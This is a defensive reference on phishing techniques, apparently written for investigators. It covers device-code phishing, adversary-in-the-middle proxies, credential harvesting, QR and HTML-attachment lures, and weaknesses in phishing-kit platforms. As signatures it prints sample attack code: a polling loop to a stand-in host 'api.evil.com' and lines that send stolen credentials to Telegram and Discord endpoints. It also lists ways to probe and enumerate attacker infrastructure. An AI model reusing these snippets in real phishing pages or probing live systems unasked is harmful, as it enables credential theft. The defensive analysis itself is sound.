# Phishing Attack Pattern Reference

## 1. OAuth Device Code Phishing

**Severity: CRITICAL — MFA completely bypassed**

### How it works
Attacker pre-generates a Microsoft OAuth Device Code via their backend, then tricks the
victim into entering the code at `login.microsoftonline.com/common/oauth2/deviceauth`.
The victim believes they are verifying a document. The attacker's backend polls Microsoft
until the code is redeemed, receiving a valid access + refresh token pair.

### JavaScript signatures
```javascript
// Constants always present
const SID  = 433124;                            // Backend session ID
const API  = 'https://api.evil.com:8443';       // C2 backend
const SPATH = '/api/status/';                   // Poll path

// Polling loop
async function pollStatus() {
    const d = await fetch(API + SPATH + SID).then(r => r.json());
    if (d.status === 'captured') { /* redirect victim */ }
    setTimeout(pollStatus, 3000);
}

// Clipboard copy + OAuth redirect on click
navigator.clipboard.writeText(userCode);
window.open('https://login.microsoftonline.com/common/oauth2/deviceauth', ...);
```

### HTML signatures
```html
<div id="userCode">FM624XDF7</div>
<a data-href="https://login.microsoftonline.com/common/oauth2/deviceauth?otc=FM624XDF7">
  Review & Sign
</a>
```

### API signatures
```
GET  /api/status/{SID}  → {"status":"pending"|"captured"|"expired"|"declined"}
POST /api/generate      → {"session_id":N,"user_code":"XYZ","verification_uri":"..."}
GET  /health            → {"database":{"active_tokens":2795,"revoked_tokens":1022}}
```

### Lure brands commonly used
- Adobe Acrobat Sign / Adobe Document Cloud
- DocuSign
- Microsoft SharePoint / OneDrive shared document
- Microsoft Security Alert / "Unknown device login"
- PayPal / banking security alerts

### Detection rules (YARA concept)
```
deviceauth AND user_code AND pollStatus AND const SID
verification_uri_complete AND login.microsoftonline.com
/api/status/ AND captured AND setTimeout
```

### MITRE ATT&CK
- T1528 — Steal Application Access Token
- T1550.001 — Use Alternate Authentication Material: Application Access Token
- T1111 — Multi-Factor Authentication Interception
- T1566.002 — Phishing: Spearphishing Link

### Containment
1. Report the OAuth app ID to Microsoft MSRC for revocation
2. Block the domain at DNS, email gateway, and proxy
3. Audit Azure AD sign-in logs — filter `clientAppUsed = "Device Code Flow"`
4. Add Conditional Access: Block Device Code Flow for non-compliant devices
5. Revoke refresh tokens for any users who completed the flow

---

## 2. AiTM (Adversary-in-the-Middle) Proxy Phishing

**Severity: CRITICAL — MFA bypassed, session cookie stolen**

### How it works
Attacker runs a reverse proxy (Evilginx, Modlishka, Muraena) that sits between the victim
and the real authentication service. The victim completes real MFA on the real site, but
the proxy intercepts the session cookie after authentication completes.

### Indicators
- Phishing URL is visually similar to real domain (typosquatting, homograph)
- Valid TLS certificate (Let's Encrypt or Cloudflare)
- Browser shows the real Microsoft login page (it IS the real page, proxied)
- User successfully "logs in" — no error — session is stolen silently
- Response headers show unusual forwarding or cookie rewriting

### HTTP response signatures
```
X-Forwarded-For: <victim IP>
Set-Cookie: .*session.*Path=/.*SameSite=None
Location: https://evil[.]domain/phishlet/...
```

### MITRE ATT&CK
- T1557 — Adversary-in-the-Middle
- T1539 — Steal Web Session Cookie
- T1111 — Multi-Factor Authentication Interception
- T1566.002 — Phishing: Spearphishing Link

### Containment
1. Revoke ALL active sessions for affected users (not just password reset)
2. Enable Continuous Access Evaluation (CAE) — reduces token lifetime
3. Block the proxy domain at DNS/email gateway
4. Enforce compliant device requirement for token issuance

---

## 3. Credential Harvesting

**Severity: HIGH**

### How it works
Fake login page that mimics Microsoft 365, Google, or corporate SSO. Victim enters
credentials which are sent to attacker via POST request, Telegram bot, or Discord webhook.

### HTML/JS signatures
```html
<input type="password" name="passwd" id="password">
<form method="POST" action="/login">
```

```javascript
// Telegram exfil
fetch('https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<ID>&text=' + creds)

// Discord webhook exfil
fetch('https://discord.com/api/webhooks/<ID>/<TOKEN>', {method:'POST', body: creds})

// Custom C2
fetch('/api/capture', {method:'POST', body: JSON.stringify({u: email, p: password})})
```

### MITRE ATT&CK
- T1056.003 — Input Capture: Web Portal Capture
- T1598.003 — Phishing for Information: Spearphishing Link
- T1566.001 — Phishing: Spearphishing Attachment (if HTML attachment)

### Containment
1. Force password reset for all users who loaded the page
2. Check proxy logs for POST to phishing domain — confirms credential submission
3. Review MFA logs — attacker may try credentials immediately

---

## 4. QR Code Phishing (Quishing)

**Severity: HIGH — bypasses email URL scanners**

### How it works
Email body contains only a QR code image (no URLs in text). Email scanning tools miss it
because they don't decode images. Victim scans QR with phone (unmanaged device, no proxy).

### Detection
```bash
# Extract QR from email attachment or inline image
# If base64 encoded in HTML:
grep -Eo 'data:image/[^;]+;base64,[A-Za-z0-9+/=]+' lure_page.html | head -1 | \
  sed 's/data:image\/[^;]*;base64,//' | base64 -d > qr_image.png

# Decode QR
zbarimg qr_image.png
# or
python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; \
  print([d.data.decode() for d in decode(Image.open('qr_image.png'))])"
```

Then investigate the decoded URL through the full workflow.

### MITRE ATT&CK
- T1566.001 — Phishing (attachment-based delivery of QR)
- T1598.003 — Phishing for Information

---

## 5. HTML Attachment Phishing

**Severity: HIGH**

### How it works
Email contains an HTML file attachment. The HTML file is a self-contained phishing page
that runs locally in the browser (bypasses URL filtering). May contain obfuscated JS,
inline base64 images, and exfil via external fetch.

### Detection
```bash
# Extract and analyse HTML attachment
python3 << 'EOF'
import email, hashlib
from email import policy

with open('/workspace/upload/sample.eml', 'rb') as f:
    msg = email.message_from_binary_file(f, policy=policy.default)

for part in msg.walk():
    if part.get_content_disposition() == 'attachment':
        fn = part.get_filename()
        if fn and fn.endswith('.html'):
            data = part.get_payload(decode=True)
            print(f"SHA256: {hashlib.sha256(data).hexdigest()}")
            # Save and analyse
            with open(f'/workspace/investigations/<case>/decoded/{fn}', 'wb') as f2:
                f2.write(data)
            print(data.decode('utf-8', errors='replace')[:1000])
EOF
```

---

## 6. PhaaS Operational Security Failures

When investigating PhaaS platforms, always check for these common OpSec failures:

| Failure | What to check | Significance |
|---|---|---|
| Unauthenticated `/health` | `curl /health` | Active victim count, server specs, timestamp |
| Unauthenticated `/api/generate` | `POST /api/generate` | Create sessions — confirms no auth required |
| Sequential session IDs | `/api/status/N` for N±100 | Enumerate all victims, gauge scale |
| Exposed `/admin` panel | `curl /admin` | Full victim dashboard |
| Exposed `/metrics` | Prometheus endpoint | Detailed operational stats |
| CORS `*` on API | Check `Access-Control-Allow-Origin` | Full cross-origin access to API |
| No rate limiting | Create 10+ sessions rapidly | Bot/automation allowed |
| Plaintext secrets in JS | Check `const API=`, `const TOKEN=` | Bot tokens, API keys hardcoded |
| Cloudflare CF-RAY region | Parse `CF-RAY: <hash>-<IATA>` | IATA code = Cloudflare PoP = approximate origin region |
